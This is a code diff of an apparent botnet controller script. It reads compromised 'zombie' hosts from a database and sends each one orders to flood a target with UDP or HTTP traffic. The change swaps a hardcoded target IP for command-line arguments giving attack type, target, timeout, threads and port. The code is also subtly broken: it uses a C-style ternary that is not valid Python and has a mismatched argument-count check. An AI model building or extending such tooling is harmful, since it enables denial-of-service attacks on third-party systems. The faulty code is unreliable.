@@ -9,6 +9,17 @@ TIMEOUT = 300
 TARGET = "108.179.184.95"
 TARGET_PORT = 7
 
+if len(sys.argv) < 4:
+    print "USAGE: {attack type} {target address} {timeout (seconds)} {# threads} {port}"
+    print "Attack types: 'udp', 'http'"
+    sys.exit(0)
+
+attack = sys.argv[1].lower()
+target = sys.argv[2]
+timeout = sys.argv[3]
+threads = sys.argv[4]
+port = len(sys.argv) > 5 ? sys.argv[5] : 7
+
 con = lite.connect('addresses.db')
 with con:    
     cur = con.cursor()
@@ -22,7 +33,7 @@ with con:
             i = i + 1
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                data = "{0} {1} {2}".format(TIMEOUT, TARGET, TARGET_PORT)
+                data = "{0} {1} {2} {3} {4}".format(attack, target, timeout, port, threads)
                 sock.connect((zombie, PORT))
                 sock.sendall(data + "\n")
                 rec = sock.recv(1024)
